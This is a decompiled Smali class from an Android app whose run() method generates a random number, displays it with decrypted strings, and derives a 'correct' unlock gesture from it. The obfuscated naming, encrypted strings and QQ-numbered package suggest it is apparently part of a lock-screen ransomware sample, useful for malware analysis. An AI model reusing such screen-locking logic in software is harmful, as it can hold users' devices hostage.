.class Lcom/cjk/s$100000001$100000000;
.super Ljava/lang/Object;
.source "s.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/cjk/s$100000001;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation


# instance fields
.field private final this$0:Lcom/cjk/s$100000001;


# direct methods
.method constructor <init>(Lcom/cjk/s$100000001;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    return-void
.end method

.method static access$0(Lcom/cjk/s$100000001$100000000;)Lcom/cjk/s$100000001;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 32
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 158
    move-object/from16 v2, p0

    move-object/from16 v25, v2

    move-object/from16 v0, v25

    iget-object v0, v0, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object/from16 v25, v0

    invoke-static/range {v25 .. v25}, Lcom/cjk/s$100000001;->access$0(Lcom/cjk/s$100000001;)Lcom/cjk/s;

    move-result-object v25

    invoke-static/range {v25 .. v25}, Lcom/cjk/s;->access$L1000000(Lcom/cjk/s;)Lcom/cjk/qq1279525738/sssp;

    move-result-object v25

    const/16 v26, 0x1

    invoke-virtual/range {v25 .. v26}, Lcom/cjk/qq1279525738/sssp;->setTouchable(Z)V

    .line 160
    move-object/from16 v25, v2

    move-object/from16 v0, v25

    iget-object v0, v0, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object/from16 v25, v0

    invoke-static/range {v25 .. v25}, Lcom/cjk/s$100000001;->access$0(Lcom/cjk/s$100000001;)Lcom/cjk/s;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Lcom/cjk/s;->getResources()Landroid/content/res/Resources;

    move-result-object v25

    const v26, 0x7f060002

    invoke-virtual/range {v25 .. v26}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v25

    move-object/from16 v4, v25

    .line 161
    move-object/from16 v25, v4

    invoke-static/range {v25 .. v25}, Lcom/cjk/BAH;->getString(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v25

    move-object/from16 v5, v25

    .line 162
    move-object/from16 v25, v5

    const-string v26, "\n"

    const-string v27, ""

    invoke-virtual/range {v25 .. v27}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v25

    move-object/from16 v6, v25

    .line 163
    move-object/from16 v25, v6

    invoke-static/range {v25 .. v25}, Lcom/cjk/M;->getsss(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v25

    move-object/from16 v7, v25

    .line 164
    move-object/from16 v25, v7

    move-object/from16 v26, v7

    const-string v27, "*"

    invoke-virtual/range {v26 .. v27}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v26

    const/16 v27, 0x1

    add-int/lit8 v26, v26, 0x1

    move-object/from16 v27, v7

    const-string v28, "/"

    invoke-virtual/range {v27 .. v28}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v27

    invoke-virtual/range {v25 .. v27}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v25

    check-cast v25, Ljava/lang/String;

    move-object/from16 v8, v25

    .line 165
    move-object/from16 v25, v7

    move-object/from16 v26, v7

    const-string v27, "/"

    invoke-virtual/range {v26 .. v27}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v26

    const/16 v27, 0x1

    add-int/lit8 v26, v26, 0x1

    move-object/from16 v27, v7

    const-string v28, "+"

    invoke-virtual/range {v27 .. v28}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v27

    invoke-virtual/range {v25 .. v27}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v25

    check-cast v25, Ljava/lang/String;

    move-object/from16 v9, v25

    .line 166
    move-object/from16 v25, v7

    move-object/from16 v26, v7

    const-string v27, "+"

    invoke-virtual/range {v26 .. v27}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v26

    const/16 v27, 0x1

    add-int/lit8 v26, v26, 0x1

    move-object/from16 v27, v7

    const-string v28, "-"

    invoke-virtual/range {v27 .. v28}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v27

    invoke-virtual/range {v25 .. v27}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v25

    check-cast v25, Ljava/lang/String;

    move-object/from16 v10, v25

    .line 167
    move-object/from16 v25, v7

    move-object/from16 v26, v7

    const-string v27, "-"

    invoke-virtual/range {v26 .. v27}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v26

    const/16 v27, 0x1

    add-int/lit8 v26, v26, 0x1

    move-object/from16 v27, v7

    invoke-virtual/range {v27 .. v27}, Ljava/lang/String;->length()I

    move-result v27

    invoke-virtual/range {v25 .. v27}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v25

    check-cast v25, Ljava/lang/String;

    move-object/from16 v11, v25

    .line 168
    move-object/from16 v25, v8

    invoke-static/range {v25 .. v25}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/Integer;->intValue()I

    move-result v25

    move/from16 v12, v25

    .line 169
    move-object/from16 v25, v9

    invoke-static/range {v25 .. v25}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/Integer;->intValue()I

    move-result v25

    move/from16 v13, v25

    .line 170
    move-object/from16 v25, v10

    invoke-static/range {v25 .. v25}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/Integer;->intValue()I

    move-result v25

    move/from16 v14, v25

    .line 171
    move-object/from16 v25, v11

    invoke-static/range {v25 .. v25}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/Integer;->intValue()I

    move-result v25

    move/from16 v15, v25

    .line 172
    move-object/from16 v25, v2

    :try_start_0
    move-object/from16 v0, v25

    iget-object v0, v0, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object/from16 v25, v0

    invoke-static/range {v25 .. v25}, Lcom/cjk/s$100000001;->access$0(Lcom/cjk/s$100000001;)Lcom/cjk/s;

    move-result-object v25

    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v26

    move-object/from16 v28, v2

    move-object/from16 v0, v28

    iget-object v0, v0, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object/from16 v28, v0

    invoke-static/range {v28 .. v28}, Lcom/cjk/s$100000001;->access$0(Lcom/cjk/s$100000001;)Lcom/cjk/s;

    move-result-object v28

    move-object/from16 v0, v28

    iget-object v0, v0, Lcom/cjk/s;->des:Lcom/cjk/DU;

    move-object/from16 v28, v0

    const-string v29, "3cc14af1e8e62628"

    invoke-virtual/range {v28 .. v29}, Lcom/cjk/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v28

    invoke-static/range {v28 .. v28}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v28

    invoke-virtual/range {v28 .. v28}, Ljava/lang/Integer;->intValue()I

    move-result v28

    move/from16 v0, v28

    int-to-double v0, v0

    move-wide/from16 v28, v0

    mul-double v26, v26, v28

    move-wide/from16 v0, v26

    double-to-int v0, v0

    move/from16 v26, v0

    move/from16 v0, v26

    move-object/from16 v1, v25

    iput v0, v1, Lcom/cjk/s;->彼岸花开:I

    move-object/from16 v25, v2

    move-object/from16 v0, v25

    iget-object v0, v0, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object/from16 v25, v0

    invoke-static/range {v25 .. v25}, Lcom/cjk/s$100000001;->access$0(Lcom/cjk/s$100000001;)Lcom/cjk/s;

    move-result-object v25

    move-object/from16 v0, v25

    iget-object v0, v0, Lcom/cjk/s;->wb:Landroid/widget/TextView;

    move-object/from16 v25, v0

    new-instance v26, Ljava/lang/StringBuffer;

    move-object/from16 v31, v26

    move-object/from16 v26, v31

    move-object/from16 v27, v31

    invoke-direct/range {v27 .. v27}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v27, Ljava/lang/StringBuffer;

    move-object/from16 v31, v27

    move-object/from16 v27, v31

    move-object/from16 v28, v31

    invoke-direct/range {v28 .. v28}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v28, v2

    move-object/from16 v0, v28

    iget-object v0, v0, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object/from16 v28, v0

    invoke-static/range {v28 .. v28}, Lcom/cjk/s$100000001;->access$0(Lcom/cjk/s$100000001;)Lcom/cjk/s;

    move-result-object v28

    move-object/from16 v0, v28

    iget-object v0, v0, Lcom/cjk/s;->des:Lcom/cjk/DU;

    move-object/from16 v28, v0

    new-instance v29, Ljava/lang/StringBuffer;

    move-object/from16 v31, v29

    move-object/from16 v29, v31

    move-object/from16 v30, v31

    invoke-direct/range {v30 .. v30}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v30, v2

    move-object/from16 v0, v30

    iget-object v0, v0, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object/from16 v30, v0

    invoke-static/range {v30 .. v30}, Lcom/cjk/s$100000001;->access$0(Lcom/cjk/s$100000001;)Lcom/cjk/s;

    move-result-object v30

    move-object/from16 v0, v30

    iget-object v0, v0, Lcom/cjk/s;->Lycorisradiata:Ljava/lang/String;

    move-object/from16 v30, v0

    invoke-virtual/range {v29 .. v30}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v29

    const-string v30, "7beba1e67a9fe3ad206117ad19e14d01"

    invoke-virtual/range {v29 .. v30}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v29

    invoke-virtual/range {v29 .. v29}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v29

    invoke-static/range {v29 .. v29}, Lcom/cjk/DU;->getbah(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v29

    invoke-virtual/range {v28 .. v29}, Lcom/cjk/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v28

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v27

    move-object/from16 v28, v2

    move-object/from16 v0, v28

    iget-object v0, v0, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object/from16 v28, v0

    invoke-static/range {v28 .. v28}, Lcom/cjk/s$100000001;->access$0(Lcom/cjk/s$100000001;)Lcom/cjk/s;

    move-result-object v28

    move-object/from16 v0, v28

    iget v0, v0, Lcom/cjk/s;->彼岸花开:I

    move/from16 v28, v0

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v27

    invoke-virtual/range {v27 .. v27}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v27

    invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v26

    move-object/from16 v27, v2

    move-object/from16 v0, v27

    iget-object v0, v0, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object/from16 v27, v0

    invoke-static/range {v27 .. v27}, Lcom/cjk/s$100000001;->access$0(Lcom/cjk/s$100000001;)Lcom/cjk/s;

    move-result-object v27

    move-object/from16 v0, v27

    iget-object v0, v0, Lcom/cjk/s;->des:Lcom/cjk/DU;

    move-object/from16 v27, v0

    const-string v28, "8a5718abb4173881"

    invoke-virtual/range {v27 .. v28}, Lcom/cjk/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v27

    invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v26

    invoke-virtual/range {v26 .. v26}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v26

    invoke-virtual/range {v25 .. v26}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 173
    :goto_0
    new-instance v25, Ljava/lang/StringBuffer;

    move-object/from16 v31, v25

    move-object/from16 v25, v31

    move-object/from16 v26, v31

    new-instance v27, Ljava/lang/StringBuffer;

    move-object/from16 v31, v27

    move-object/from16 v27, v31

    move-object/from16 v28, v31

    invoke-direct/range {v28 .. v28}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v28, v2

    move-object/from16 v0, v28

    iget-object v0, v0, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object/from16 v28, v0

    invoke-static/range {v28 .. v28}, Lcom/cjk/s$100000001;->access$0(Lcom/cjk/s$100000001;)Lcom/cjk/s;

    move-result-object v28

    move-object/from16 v0, v28

    iget v0, v0, Lcom/cjk/s;->彼岸花开:I

    move/from16 v28, v0

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v27

    const-string v28, ""

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v27

    invoke-virtual/range {v27 .. v27}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v27

    invoke-direct/range {v26 .. v27}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    move-object/from16 v16, v25

    .line 174
    new-instance v25, Ljava/lang/StringBuffer;

    move-object/from16 v31, v25

    move-object/from16 v25, v31

    move-object/from16 v26, v31

    invoke-direct/range {v26 .. v26}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v26, v16

    invoke-virtual/range {v26 .. v26}, Ljava/lang/StringBuffer;->reverse()Ljava/lang/StringBuffer;

    move-result-object v26

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v25

    const-string v26, ""

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v25

    invoke-static/range {v25 .. v25}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/Integer;->intValue()I

    move-result v25

    move/from16 v17, v25

    .line 178
    move/from16 v25, v17

    move/from16 v26, v12

    mul-int v25, v25, v26

    move/from16 v26, v13

    div-int v25, v25, v26

    move/from16 v26, v14

    add-int v25, v25, v26

    move/from16 v26, v15

    sub-int v25, v25, v26

    move/from16 v18, v25

    .line 179
    new-instance v25, Ljava/lang/StringBuffer;

    move-object/from16 v31, v25

    move-object/from16 v25, v31

    move-object/from16 v26, v31

    invoke-direct/range {v26 .. v26}, Ljava/lang/StringBuffer;-><init>()V

    move/from16 v26, v18

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v25

    const-string v26, ""

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v25

    move-object/from16 v19, v25

    .line 180
    move-object/from16 v25, v19

    const-string v26, "9"

    const-string v27, ""

    invoke-virtual/range {v25 .. v27}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v25

    move-object/from16 v20, v25

    .line 181
    new-instance v25, Ljava/lang/StringBuffer;

    move-object/from16 v31, v25

    move-object/from16 v25, v31

    move-object/from16 v26, v31

    new-instance v27, Ljava/lang/StringBuffer;

    move-object/from16 v31, v27

    move-object/from16 v27, v31

    move-object/from16 v28, v31

    move-object/from16 v29, v20

    invoke-direct/range {v28 .. v29}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v27 .. v27}, Ljava/lang/StringBuffer;->reverse()Ljava/lang/StringBuffer;

    move-result-object v27

    invoke-virtual/range {v27 .. v27}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v27

    const-string v28, "(?s)(.)(?=.*\\1)"

    const-string v29, ""

    invoke-virtual/range {v27 .. v29}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v27

    invoke-direct/range {v26 .. v27}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->reverse()Ljava/lang/StringBuffer;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v25

    move-object/from16 v21, v25

    .line 182
    move-object/from16 v25, v21

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move/from16 v0, v25

    new-array v0, v0, [I

    move-object/from16 v25, v0

    move-object/from16 v22, v25

    .line 183
    move-object/from16 v25, v2

    move-object/from16 v0, v25

    iget-object v0, v0, Lcom/cjk/s$100000001$100000000;->this$0:Lcom/cjk/s$100000001;

    move-object/from16 v25, v0

    invoke-static/range {v25 .. v25}, Lcom/cjk/s$100000001;->access$0(Lcom/cjk/s$100000001;)Lcom/cjk/s;

    move-result-object v25

    invoke-static/range {v25 .. v25}, Lcom/cjk/s;->access$L1000000(Lcom/cjk/s;)Lcom/cjk/qq1279525738/sssp;

    move-result-object v25

    move-object/from16 v26, v22

    invoke-virtual/range {v25 .. v26}, Lcom/cjk/qq1279525738/sssp;->setCorrectGesture([I)V

    .line 184
    const/16 v25, 0x0

    move/from16 v23, v25

    :goto_1
    move/from16 v25, v23

    move-object/from16 v26, v21

    invoke-virtual/range {v26 .. v26}, Ljava/lang/String;->length()I

    move-result v26

    move/from16 v0, v25

    move/from16 v1, v26

    if-lt v0, v1, :cond_0

    return-void

    .line 172
    :catch_0
    move-exception v25

    move-object/from16 v16, v25

    goto/16 :goto_0

    .line 186
    :cond_0
    move-object/from16 v25, v22

    move/from16 v26, v23

    move-object/from16 v27, v21

    move/from16 v28, v23

    invoke-virtual/range {v27 .. v28}, Ljava/lang/String;->charAt(I)C

    move-result v27

    invoke-static/range {v27 .. v27}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v27

    invoke-static/range {v27 .. v27}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v27

    aput v27, v25, v26

    .line 184
    add-int/lit8 v23, v23, 0x1

    goto :goto_1
.end method
